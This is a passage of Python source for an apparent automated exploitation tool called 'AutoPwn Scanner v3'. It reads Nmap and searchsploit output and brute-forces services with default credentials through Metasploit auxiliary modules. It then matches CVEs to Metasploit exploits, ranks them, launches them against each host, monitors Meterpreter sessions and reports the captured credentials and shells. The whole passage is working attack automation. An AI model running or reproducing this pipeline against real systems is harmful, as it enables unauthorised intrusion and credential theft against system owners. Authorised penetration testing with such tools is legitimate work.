                f"| {vd['service']} | {vd['version'] or '—'} "
                f"| {cves_str} "
                f"| {vd['exploit_name'] or '—'} "
                f"| {msf_badge} | {rank_str} |")
        lines += ["", "---", ""]

        # ── Credentials ──────────────────────────────────────────
        lines += ["## Credentials Found", ""]
        if creds:
            lines += ["| IP | Port | Service | Username | Password |",
                       "|----|------|---------|----------|----------|"]
            for c in creds:
                lines.append(
                    f"| `{c[-1]}` | {c[2]} | {c[3]} "
                    f"| `{c[4]}` | `{c[5]}` |")
        else:
            lines.append("> No credentials found during this scan.")
        lines += ["", "---", ""]

        # ── Exploitation Attempts ────────────────────────────────
        lines += ["## Exploitation Attempts", ""]
        lines += ["| Module | Target | Port | Payload | Rank | Result | Error |",
                  "|--------|--------|------|---------|------|--------|-------|"]
        for e in exploits:
            ed     = dict(zip(e_cols, e))
            result = "✅ **SUCCESS**" if ed["success"] else "❌ failed"
            error  = ed.get("error_msg") or "—"
            lines.append(
                f"| `{ed['msf_module']}` "
                f"| `{ed['rhost']}` "
                f"| {ed['rport'] or '—'} "
                f"| {ed.get('payload_used') or '—'} "
                f"| {ed.get('msf_rank','—')} "     # from joined vuln
                f"| {result} "
                f"| {error} |")
        lines += ["", "---", ""]

        # ── Successful Sessions ──────────────────────────────────
        lines += ["## Successful Sessions", ""]
        success_e = [e for e in exploits
                     if e[e_cols.index("success")]]
        if success_e:
            lines += [
                "| Session ID | Target | Module | User | Payload | Time |",
                "|------------|--------|--------|------|---------|------|"]
            for e in success_e:
                ed = dict(zip(e_cols, e))
                lines.append(
                    f"| `{ed['session_id']}` "
                    f"| `{ed['rhost']}` "
                    f"| `{ed['msf_module']}` "
                    f"| **{ed.get('session_user','?')}** "
                    f"| {ed.get('payload_used','—')} "
                    f"| {ed['attempt_time'][:19]} |")
        else:
            lines.append("> No successful sessions in this run.")

        lines += ["", "---", "",
                  "*Report generated by AutoPwn Scanner v3.0*"]

        content = "\n".join(lines)
        with open(path, "w") as f:
            f.write(content)

        ok(f"Markdown report → {path}")
        return path


# ════════════════════════════════════════════════════════════════
#  ORCHESTRATOR — LogicMapper
# ════════════════════════════════════════════════════════════════
class LogicMapper:
    def __init__(self, xml_path: str, json_path: str,
                 monitor_interval: int = MONITOR_INTERVAL,
                 output_dir: str = "./results"):
        self.xml_path         = xml_path
        self.json_path        = json_path
        self.output_dir       = output_dir
        self.db               = Database(DB_PATH)
        self.msf              = MetasploitManager()
        self.monitor: Optional[MeterpreterMonitor] = None
        self._monitor_interval = monitor_interval
        self._session_ids_created: list[int] = []  # per cleanup

        # Gestione SIGINT → cleanup ordinato
        signal.signal(signal.SIGINT, self._handle_sigint)

    def _handle_sigint(self, sig, frame):
        warn("\nInterrupted. Running cleanup...")
        self._cleanup()
        sys.exit(0)

    def _cleanup(self):
        if self.monitor:
            self.monitor.stop()
        if self.msf.is_connected():
            self.msf.kill_all_sessions()
        self.db.close()

    def run(self):
        print("\n" + "═" * 56)
        print("  LOGIC MAPPER v3 — Pipeline start")
        print("═" * 56 + "\n")

        # ── Avvia monitor ────────────────────────────────────────
        if self.msf.is_connected():
            self.monitor = MeterpreterMonitor(
                self.msf.client, self.db, self._monitor_interval)
            self.monitor.start()

        # ── Step 1: Parse Nmap XML ───────────────────────────────
        parser = NmapParser(self.xml_path)
        hosts  = parser.parse()
        if not hosts:
            warn("No hosts found. Stopping.")
            self._cleanup()
            return

        # ── Step 2: Load searchsploit results ────────────────────
        ss_filter = SearchsploitFilter(self.json_path)

        # ── Step 3: Per ogni host ────────────────────────────────
        for host in hosts:
            ip       = host["ip"]
            hostname = host["hostname"]
            os_info  = host["os"]
            arch     = host["arch"]

            print(f"\n{'─'*56}")
            info(f"Host: {ip}  ({hostname or 'n/a'})  "
                 f"OS: {os_info or 'unknown'}  arch: {arch or '?'}")
            print(f"{'─'*56}")

            target_id = self.db.insert_target(ip, hostname, os_info, arch)

            for port_info in host["ports"]:
                port      = port_info["port"]
                protocol  = port_info["protocol"]
                service   = port_info["service"]
                version   = port_info["version"]
                cves      = port_info["cves"]
                http_paths= port_info["http_paths"]
                cves_str  = ",".join(cves) if cves else ""

                print(f"\n  ↳ {port}/{protocol}  {service}  {version}")
                if cves:
                    info(f"    CVEs: {', '.join(cves[:5])}"
                         + (" ..." if len(cves) > 5 else ""))

                # ── FASE 2a: Auxiliary brute-force ───────────────
                credentials: list[dict] = []
                if port in AUXILIARY_MAP and self.msf.is_connected():
                    aux_mod = AUXILIARY_MAP[port]
                    info(f"    Running auxiliary: {aux_mod}")
                    found = self.msf.run_auxiliary(
                        aux_mod, ip, port,
                        [(u, p) for u, p in DEFAULT_CREDS])
                    for cred in found:
                        self.db.insert_credential(
                            target_id, port, service,
                            cred["username"], cred["password"])
                        credentials.append(cred)

                # Recupera anche credenziali da run precedenti
                credentials += self.db.get_credentials(target_id, port)

                # ── FASE 2b: Ricerca moduli per CVE ──────────────
                msf_modules_from_cve: list[str] = []
                if cves and self.msf.is_connected():
                    for cve in cves[:3]:  # limita a 3 CVE per porta
                        mods = self.msf.search_by_cve(cve)
                        msf_modules_from_cve.extend(mods)
                    msf_modules_from_cve = list(dict.fromkeys(
                        msf_modules_from_cve))
                    if msf_modules_from_cve:
                        ok(f"    CVE→MSF modules: "
                           f"{', '.join(msf_modules_from_cve[:3])}")

                # ── FASE 2c: Filtro searchsploit ──────────────────
                ss_exploits = ss_filter.get_msf_exploits(cves)

                # Unisce CVE-based e searchsploit, deduplicati
                all_modules: list[dict] = []

                for mod_path in msf_modules_from_cve:
                    all_modules.append({
                        "title":      mod_path,
                        "path":       "",
                        "msf_module": mod_path,
                        "cve_match":  True,
                        "source":     "cve_search",
                    })

                for ex in ss_exploits:
                    mod = ss_filter._MSF_PATH_RE.search(ex["path"])
                    msf_path = self.msf.path_to_module(ex["path"]) if mod else None
                    if msf_path and msf_path not in [
                            m["msf_module"] for m in all_modules]:
                        all_modules.append({
                            "title":      ex["title"],
                            "path":       ex["path"],
                            "msf_module": msf_path,
                            "cve_match":  ex["cve_match"],
                            "source":     "searchsploit",
                        })

                # ── FASE 2d: Ranking & esecuzione ────────────────
                # Arricchisce con rank e ordina
                ranked: list[tuple[int, dict]] = []
                for m in all_modules:
                    rank_str = self.msf.get_rank(m["msf_module"]) \
                               if self.msf.is_connected() else "normal"
                    rank_val = RANK_ORDER.get(rank_str, 3)
                    m["rank"] = rank_str

                    # CVE match diretto → boost rank
                    if m["cve_match"]:
                        rank_val = max(0, rank_val - 1)

                    ranked.append((rank_val, m))

                ranked.sort(key=lambda x: x[0])

                for rank_val, m in ranked:
                    mod_path = m["msf_module"]
                    rank_str = m["rank"]

                    # Inserisce la vulnerabilità nel DB
                    vuln_id = self.db.insert_vulnerability(
                        target_id, port, protocol,
                        service, version, cves_str,
                        m["title"], m["path"],
                        mod_path, rank_str, True)

                    if not self.msf.is_connected():
                        continue

                    # Moduli rischiosi → chiedi conferma
                    if rank_str in RISKY_RANKS:
                        warn(f"    Module {mod_path} has rank '{rank_str}'.")
                        try:
                            ans = input(
                                f"    Run anyway? [y/N]: ").strip().lower()
                        except EOFError:
                            ans = "n"
                        if ans != "y":
                            info(f"    Skipped: {mod_path}")
                            continue

                    result = self.msf.run_exploit(
                        mod_path, ip, port,
                        os_info, arch,
                        http_paths, credentials)

                    attempt_id = self.db.insert_exploit_attempt(
                        vuln_id, mod_path, ip, port,
                        result["payload_used"],
                        result["session_id"],
                        result["session_user"],
                        result["success"],
                        result.get("error") or "")

                    if result["success"] and result["session_id"]:
                        self._session_ids_created.append(
                            result["session_id"])

        # ── Step 4: Attendi sessioni ritardate ───────────────────
        print()
        info(f"Waiting {POST_PIPELINE_WAIT}s for delayed sessions...")
        time.sleep(POST_PIPELINE_WAIT)

        if self.monitor:
            self.monitor.stop()

        # ── Step 5: Genera report Markdown ──────────────────────
        report_path = Path(self.output_dir) / (
            "report_" + datetime.now().strftime("%Y%m%d_%H%M%S") + ".md")
        reporter = MarkdownReporter(self.db, str(report_path))
        reporter.generate()

        ok("Pipeline complete. All data saved.")
        self.db.close()


# ════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════
def main():
    ap = argparse.ArgumentParser(
        description="AutoPwn Scanner v3 — Logic Mapper")
    ap.add_argument("--xml",  required=True,
                    help="Nmap XML output path")
    ap.add_argument("--json", required=True,
                    help="Searchsploit JSON output path")
    ap.add_argument("--monitor-interval", type=int,
                    default=MONITOR_INTERVAL, metavar="SEC",
                    help=f"Session poll interval (default: {MONITOR_INTERVAL})")
    ap.add_argument("--output-dir", default="./results",
                    help="Directory for report output")
    args = ap.parse_args()

    mapper = LogicMapper(
        args.xml, args.json,
        args.monitor_interval,
        args.output_dir)
    mapper.run()


if __name__ == "__main__":
    main()
